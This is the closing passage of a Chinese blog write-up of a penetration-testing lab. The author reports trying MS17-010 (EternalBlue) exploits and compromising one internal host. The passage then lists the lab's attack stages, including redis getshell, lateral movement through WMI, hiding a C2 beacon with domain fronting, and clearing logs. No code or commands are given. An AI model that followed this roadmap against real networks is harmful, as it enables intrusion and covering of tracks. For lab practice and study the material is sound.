+所有 ms17-010 都试了一遍，能扫出来，就是 shell 出不来，先放弃了,原因在这个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14021537.html">博客</a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14021537.html">https://www.cnblogs.com/yokan/p/14021537.html</a></p>
+<p>根据，拿下 141
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiHTuruX5AakcAwGozymd4OvqoTz.png" alt="" />
+然后发现卡了很久，，利用永恒之蓝系统容易崩，就当可以了吧</p>
+<hr />
+<p>目前的进度是拿下 141，没有拿下 138，版本原因各种方法都试了一直有问题，有空再试试吧，有点耽误时间了</p>
+<h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2>
+<p>官网路线： 10.内网攻击姿势-SMB 远程桌面口令猜测</p>
+<p>11.内网攻击姿势-Oracle 数据库 TNS 服务漏洞 12.内网攻击姿势-RPC DCOM 服务漏洞</p>
+<p>四、横向移动 13.内网其它主机端口-文件读取 14.内网其它主机端口-redis 15.内网其它主机端口-redis Getshell 16.内网其它主机端口-MySQL 数据库 17.内网其它主机端口-MySQL 提权</p>
+<p>五、构建通道 18.内网其它主机端口-代理转发</p>
+<p>六、持久控制 19.域渗透-域成员信息收集 20.域渗透-基础服务弱口令探测及深度利用之 powershell 21.域渗透-横向移动[wmi 利用] 22.域渗透-C2 命令执行 23.域渗透-利用 DomainFronting 实现对 beacon 的深度隐藏 24.域渗透-域控实现与利用</p>
+<p>七、痕迹清理
+25、日志清理</p>
+<p>可以看到想进目标内网，需要先再外网打点，找到目标单位的外网服务站点、主机漏洞，并获得 Shell，再借助外网服务器当跳板机访问目标内网。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/14/%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E5%B0%8F%E8%AE%B0/" rel="prev" title="扫描技术小记">
+                  <i class="fa fa-chevron-left"></i> 扫描技术小记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/07/19/Nmap%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E5%BA%93%E5%88%A9%E7%94%A8/" rel="next" title="Nmap服务识别指纹库利用">
+                  Nmap服务识别指纹库利用 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">c4ooc0</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">19k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:09</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"per_page":true,"tags":"none","engine":"mathjax","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<script class="next-config" data-name="exif" type="application/json">"{FocalLength}mm f/{FNumber} {ExposureTime}s"</script>
+<script src="https://fastly.jsdelivr.net/npm/exif-js@2/exif.min.js"></script>
+<script src="/lib/exif.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>
+</html>
